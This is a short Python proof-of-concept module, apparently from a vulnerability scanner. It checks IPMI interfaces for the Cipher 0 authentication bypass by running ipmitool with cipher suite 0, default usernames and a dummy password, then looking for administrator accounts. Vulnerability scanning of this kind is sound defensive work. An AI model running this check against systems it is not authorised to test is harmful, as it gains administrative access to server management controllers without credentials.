#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *
from lib.poc.process import check_cmd_output


async def do_scan(ip, port, service, is_http, task_msg):
    if service != 'ipmi_cipher0':
        return
    try:
        for user in ['root', 'ADMIN']:
            if await poc(ip, user):
                ret = {
                    'alert_group': 'IPMI Cipher0 Auth Bypass',
                    'affects': ip,
                    'details': 'IPMI Authentication Bypass via Cipher0, IP: %s User: %s' % (ip, user)
                }
                return ret
    except Exception as e:
        debug(e)


async def poc(ip, user):
    try:
        ipmitool_path = check_cmd_output('which ipmitool', 2, shell=True)
        args = [ipmitool_path, '-H', ip, '-I', 'lanplus', '-C', '0', '-U', user, '-P', 'fluffy-wuffy', 'user', 'list']
        output = await check_cmd_output(' '.join(args), 10)

        if re.findall(r'.*ADMINISTRATOR.*', output):
            return True
    except Exception as e:
        return False

